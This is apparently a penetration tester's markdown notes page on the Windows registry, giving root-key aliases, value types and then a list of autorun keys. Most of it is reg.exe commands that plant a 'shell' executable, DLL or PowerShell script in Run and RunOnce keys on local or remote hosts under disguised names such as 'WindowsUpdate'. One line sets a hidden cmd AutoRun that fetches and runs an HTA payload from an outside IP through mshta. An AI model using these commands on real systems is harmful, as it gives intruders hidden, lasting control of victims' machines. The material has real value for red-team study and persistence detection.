# Registry Key References

## Predefined Registry Root Keys Table Reference

|Predefined Registry Root Keys|Aliases|
|-----------------------------|-------|
|HKEY_CURRENT_USER|HKCU|
|HKEY_LOCAL_MACHINE|HKLM|
|HKEY_USERS|HKU|
|HKEY_CURRENT_CONFIG|HKCC|
|HKEY_CLASSES_ROOT|HKCR|
|HKEY_PERFORMANCE_DATA|NaN|
|HKEY_DYN_DATA|NaN|

## Registry Value Types Table Reference

TODO: fill in the missing info

|Type ID|reg.exe|Set-ItemProperty|DataType in .reg|WMI|
|----|-------|----------------|----------------|----------------|
|1|REG_SZ|String|||
|2|REG_EXPAND_SZ|ExpandString|hexadecimal(2)||
|3|REG_BINARY|Binary|hexadecimal||
|4|REG_DWORD|DWord|dword||
|5|REG_MULTI_SZ|MultiString|hexadecimal(7)||
|11|REG_QWORD|QWord|qword||

## Registry Paths List

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

### HKLM

```
C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v UpdateOnce /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices /v WindowsService /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce /v UpdateSVC /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v Dependency /t REG_SZ /d "C:\path\to\shell.dll"
```

### HKCU

```
C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "powershell.exe -ep bypass -w hidden -nologo -NonI -f C:\path\to\shell.ps1" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v WindowsUpdate /t REG_SZ /d "rundll32.exe C:\path\to\shell.dll,ExecuteShell" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg add [\\<IP>\]HKCU\SOFTWARE\Microsoft\Command Processor /v AutoRun /t REG_SZ /d "powershell.exe Start-Process -windowstyle hidden -FilePath mshta.exe http://<IP>/shell.hta" /f
```